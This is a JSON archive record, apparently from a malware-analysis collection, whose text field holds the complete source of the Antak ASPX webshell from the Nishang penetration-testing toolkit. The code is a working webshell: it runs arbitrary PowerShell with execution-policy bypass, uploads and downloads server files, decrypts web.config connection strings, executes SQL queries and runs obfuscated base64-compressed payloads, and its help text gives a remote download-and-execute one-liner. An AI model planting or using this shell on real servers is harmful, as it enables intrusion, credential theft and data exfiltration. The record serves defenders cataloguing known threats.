{
    "id": "0f9cd490-0082-4ba8-8ca5-3fdbe6c00b25",
    "created_at": "2023-01-12T15:01:20.226406Z",
    "updated_at": "2025-03-27T02:05:25.189656Z",
    "deleted_at": null,
    "sha1_hash": "1b6ea97ea2c94bb3fd7b71577bedb9837538a74b",
    "title": "2015-08-19 - Antak WebShell",
    "authors": "",
    "file_creation_date": "2022-05-28T16:09:50Z",
    "file_modification_date": "2022-05-28T16:09:50Z",
    "file_size": 116834,
    "plain_text": "# nishang/antak.aspx at master · samratashok/nishang · GitHub\n\n**[github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx](https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx)**\n\nsamratashok\n\n<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %>\n\n<%@ Import Namespace=\"System.Diagnostics\" %>\n\n<%@ Import Namespace=\"System.IO\" %>\n\n<%@ Import Namespace=\"System.IO.Compression\" %>\n\n<%@ Import Namespace=\"Microsoft.VisualBasic\" %>\n\n<%--Antak - A Webshell which utilizes PowerShell.--%>\n\n<script Language=\"c#\" runat=\"server\">\n\nprotected void Login_Click(object sender, EventArgs e)\n\n{\n\n// WARNING: Don't be lazy, change values below for username and password. Default\ncredentials are disastrous.\n\n\n-----\n\n// Default Username is \"Disclaimer\" and Password is \"ForLegitUseOnly\" without quotes\nand case-sensitive.\n\nif (Username.Text == \"Disclaimer\" && Password.Text == \"ForLegitUseOnly\")\n\n{\n\nexecution.Visible = true;\n\nexecution.Enabled = true;\n\nauthentication.Visible = false;\n\noutput.Text = @\"Welcome to Antak - A Webshell which utilizes PowerShell\n\nUse help for more details.\n\nUse clear to clear the screen.\";\n\n}\n\n}\n\nprotected override void OnInit(EventArgs e)\n\n{\n\nexecution.Visible = false;\n\nexecution.Enabled = false;\n\n}\n\nstring do_ps(string arg)\n\n{\n\n//This section based on cmdasp webshell by http://michaeldaw.org\n\nProcessStartInfo psi = new ProcessStartInfo();\n\npsi.FileName = \"powershell.exe\";\n\npsi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;\n\npsi.RedirectStandardOutput = true;\n\npsi.UseShellExecute = false;\n\n\n-----\n\nProcess p = Process.Start(psi);\n\nStreamReader stmrdr = p.StandardOutput;\n\nstring s = stmrdr.ReadToEnd();\n\nstmrdr.Close();\n\nreturn s;\n\n}\n\nvoid ps(object sender, System.EventArgs e)\n\n{\n\nstring option = console.Text.ToLower();\n\nif (option.Equals(\"help\"))\n\n{\n\noutput.Text = @\"Use this shell as a normal powershell console. Each command is\nexecuted in a new process, keep this in mind\n\nwhile using commands (like changing current directory or running session aware\nscripts).\n\n- Scripts can be executed on the target using any of the below methods:\n\n1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably\nlarge script could be executed using this.\n\n2. Use powershell one-liner (example below) for download & execute in the command\nbox.\n\nIEX ((New-Object Net.WebClient).DownloadString('URL to script here')); [Arguments\nhere]\n\n3. By uploading the script to the target and executing it.\n\n4. Make the script a semi-colon separated one-liner.\n\n- Uploading a file:\n\n\n-----\n\nTo upload a file you must mention the actual path on server (with write permissions) in\ncommand textbox.\n\n(OS temporary directory like C:\\Windows\\Temp may be writable.)\n\nThen use Browse and Upload buttons to upload file to that path.\n\n- Downloading a file:\n\nTo download a file enter the actual path on the server in command textbox.\n\nThen click on Download button.\n\n- SQL Queries could be executed by following below steps:\n\n1. Click on 'Parse Web.Config' button to get dabase connection string. By default, Antak\nlooks for web.config in\n\nthe C:\\Inetpub directory. You can specify a full path in the command box to look for\nweb.config in other directory.\n\n2. Paste that connection string in the textbox besides the 'Execute SQL Query' button.\n\n3. Enter the SQL Query in the command box.\n\n4. Click the 'Execute SQL Query' button.\n\nAntak is a part of Nishang and updates could be found here:\n\nhttps://github.com/samratashok/nishang\n\nBlog posts about Antak could be found here\n\nhttp://www.labofapenetrationtester.com/search/label/Antak\n\n\";\n\nconsole.Text = string.Empty;\n\nconsole.Focus();\n\n}\n\nelse if (option.Equals(\"clear\"))\n\n{\n\n\n-----\n\noutput.Text = string.Empty;\n\nconsole.Text = string.Empty;\n\nconsole.Focus();\n\n}\n\nelse\n\n{\n\noutput.Text += \"\\nPS> \" + console.Text + \"\\n\" + do_ps(console.Text);\n\nconsole.Text = string.Empty;\n\nconsole.Focus();\n\n}\n\n}\n\nvoid execcommand(string cmd)\n\n{\n\noutput.Text += \"PS> \" + \"\\n\" + do_ps(cmd);\n\nconsole.Text = string.Empty;\n\nconsole.Focus();\n\n}\n\nvoid base64encode(string inputstr)\n\n{\n\n// Compression and encoding directly stolen from Compress-PostScript by Carlos Perez\n\n//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-andcode-signing-part-2.html\n\nstring contents = console.Text;\n\nif (inputstr != \"null\")\n\n{\n\n\n-----\n\ncontents = inputstr;\n\n}\n\n// Compress Script\n\nMemoryStream ms = new MemoryStream();\n\nDeflateStream cs = new DeflateStream(ms, CompressionMode.Compress);\n\nStreamWriter sw = new StreamWriter(cs, ASCIIEncoding.ASCII);\n\nsw.WriteLine(contents);\n\nsw.Close();\n\nstring code = Convert.ToBase64String(ms.ToArray());\n\nstring command = \"Invoke-Expression $(New-Object IO.StreamReader (\" +\n\n\"$(New-Object IO.Compression.DeflateStream (\" +\n\n\"$(New-Object IO.MemoryStream (,\" +\n\n\"$([Convert]::FromBase64String('\" + code + \"')))), \" +\n\n\"[IO.Compression.CompressionMode]::Decompress)),\" +\n\n\" [Text.Encoding]::ASCII)).ReadToEnd();\";\n\nexeccommand(command);\n\n}\n\nprotected void uploadbutton_Click(object sender, EventArgs e)\n\n{\n\n\n-----\n\nif (upload.HasFile)\n\n{\n\ntry\n\n{\n\nstring filename = Path.GetFileName(upload.FileName);\n\nupload.SaveAs(console.Text + \"\\\\\" + filename);\n\noutput.Text = \"File uploaded to: \" + console.Text + \"\\\\\" + filename;\n\n}\n\ncatch (Exception ex)\n\n{\n\noutput.Text = \"Upload status: The file could not be uploaded. The following error\noccured: \" + ex.Message;\n\n}\n\n}\n\n}\n\nprotected void downloadbutton_Click(object sender, EventArgs e)\n\n{\n\ntry\n\n{\n\nResponse.ContentType = \"application/octet-stream\";\n\nResponse.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" +\nconsole.Text);\n\nResponse.TransmitFile(console.Text);\n\nResponse.End();\n\n}\n\n\n-----\n\ncatch (Exception ex)\n\n{\n\noutput.Text = ex.ToString();\n\n}\n\n}\n\nprotected void encode_Click(object sender, EventArgs e)\n\n{\n\nbase64encode(\"null\");\n\n}\n\n// PowerShell logic in ConnectionStr_Click and executesql_Click taken from\nhttps://github.com/NetSPI/cmdsql\n\nprotected void ConnectionStr_Click(object sender, EventArgs e)\n\n{\n\noutput.Text = @\"By default, web.config is searched for in C:\\inetpub. To look at other\nlocation, specify the full path in the command textbox.\n\n\";\n\nstring webpath = \"C:\\\\inetpub\";\n\nif (console.Text != string.Empty)\n\n{\n\nwebpath = console.Text;\n\n}\n\n\n-----\n\nstring pscode = \"$ErrorActionPreference = \\'SilentlyContinue\\';$path=\" + \"\\\"\" + webpath\n+ \"\\\"\" + \";\" + \"Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) {; Try {\n$xml = [xml](get-content $file.FullName) } Catch { continue };Try { $connstrings =\n$xml.get_DocumentElement() } Catch { continue };if\n($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null)\n{;$tempdir = (Get-Date).Ticks;new-item $env:temp\\\\$tempdir -ItemType directory | outnull; copy-item $file.FullName $env:temp\\\\$tempdir;$aspnet_regiis = (get-childitem\n$env:windir\\\\microsoft.net\\\\ -Filter aspnet_regiis.exe -recurse | select-object -last\n1).FullName + \\' -pdf \\\"\\\"connectionStrings\\\"\\\" \\' + $env:temp + \\'\\\\\\' + $tempdir;InvokeExpression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\\\\$tempdir\\\\$file) }\nCatch { continue };Try { $connstrings = $xml.get_DocumentElement() } Catch { continue\n};remove-item $env:temp\\\\$tempdir -recurse};Foreach ($_ in\n$connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host\n\\\"\\\"$file.Fullname --- $_.connectionString\\\"\\\"} } };\";\n\nbase64encode(pscode);\n\n}\n\nprotected void executesql_Click(object sender, EventArgs e)\n\n{\n\noutput.Text = @\"Use a connection string retrieved from the server and copy it in the\nconnection string textbox.\n\n\";\n\nstring Constr = sqlconnectiostr.Text;\n\nstring sqlcmd = console.Text;\n\nstring pscode = \"$Connection = New-Object\nSystem.Data.SQLClient.SQLConnection;$Connection.ConnectionString = \" + \"\\\"\" +\nConstr + \"\\\"\" + \";\" + \"$Connection.Open();$Command = New-Object\nSystem.Data.SQLClient.SQLCommand;$Command.Connection =\n$Connection;$Command.CommandText = \" + \"\\\"\" + sqlcmd + \"\\\"\" + \";\" + \"$Reader =\n$Command.ExecuteReader();while ($reader.Read()) {;New-Object PSObject -Property\n@{Name = $reader.GetValue(0)};};$Connection.Close()\";\n\nbase64encode(pscode);\n\n}\n\n</script>\n\n<HTML>\n\n<HEAD>\n\n\n-----\n\n<title>Antak Webshell</title>\n\n</HEAD>\n\n<body bgcolor=\"#808080\">\n\n<div>\n\n<form id=\"Form1\" method=\"post\" runat=\"server\" style=\"background-color: #808080\">\n\n<asp:Panel ID=\"authentication\" runat=\"server\" HorizontalAlign=\"Center\" >\n\n<asp:TextBox ID=\"Username\" runat=\"server\" style=\"margin-left: 0px\" Width=\"300px\">\n</asp:TextBox> <br />\n\n<asp:TextBox ID=\"Password\" runat=\"server\" Width=\"300px\"></asp:TextBox><br />\n\n<asp:Button ID=\"Login\" runat=\"server\" Text=\"Login\" OnClick=\"Login_Click\"\nWidth=\"101px\"/><br />\n\n</asp:Panel>\n\n<asp:Panel ID=\"execution\" runat=\"server\" >\n\n<div runat=\"server\" style=\"text-align:center; resize:vertical\">\n\n<asp:TextBox ID=\"output\" runat=\"server\" TextMode=\"MultiLine\" BackColor=\"#012456\"\nForeColor=\"White\" style=\"height: 526px; width: 891px;\" ReadOnly=\"True\">\n</asp:TextBox>\n\n<asp:TextBox ID=\"console\" runat=\"server\" BackColor=\"#012456\" ForeColor=\"Yellow\"\nWidth=\"891px\" TextMode=\"MultiLine\" Rows=\"1\" onkeydown=\"if(event.keyCode == 13)\ndocument.getElementById('cmd').click()\" Height=\"23px\" AutoCompleteType=\"None\">\n</asp:TextBox>\n\n</div>\n\n<div runat=\"server\" style=\"width: auto; text-align:center\">\n\n<asp:Button ID=\"cmd\" runat=\"server\" Text=\"Submit\" OnClick=\"ps\" />\n\n<asp:FileUpload ID=\"upload\" runat=\"server\"/>\n\n<asp:Button ID=\"uploadbutton\" runat=\"server\" Text=\"Upload the File\"\nOnClick=\"uploadbutton_Click\" />\n\n\n-----\n\n<asp:Button ID=\"encode\" runat=\"server\" Text=\"Encode and Execute\"\nOnClick=\"encode_Click\"/>\n\n<asp:Button ID=\"downloadbutton\" runat=\"server\" Text=\"Download\"\nOnClick=\"downloadbutton_Click\" /> <br />\n\n<asp:Button ID=\"ConnectionStr\" runat=\"server\" Text=\"Parse web.config\"\nOnClick=\"ConnectionStr_Click\"/>\n\n<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"\nOnClick=\"executesql_Click\" />\n\n<asp:TextBox ID=\"sqlconnectiostr\" runat=\"server\" Width=\"352px\">Enter Connection\nString here to Execute SQL Queries</asp:TextBox>\n\n</div>\n\n</asp:Panel >\n\n</form>\n\n</div>\n\n</body>\n\n</HTML>\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-08-19 - Antak WebShell.pdf"
    ],
    "report_names": [
        "2015-08-19 - Antak WebShell.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535680,
    "ts_updated_at": 1743041125,
    "ts_creation_date": 1653754190,
    "ts_modification_date": 1653754190,
    "files": {
        "pdf": "https://archive.orkl.eu/1b6ea97ea2c94bb3fd7b71577bedb9837538a74b.pdf",
        "text": "https://archive.orkl.eu/1b6ea97ea2c94bb3fd7b71577bedb9837538a74b.txt",
        "img": "https://archive.orkl.eu/1b6ea97ea2c94bb3fd7b71577bedb9837538a74b.jpg"
    }
}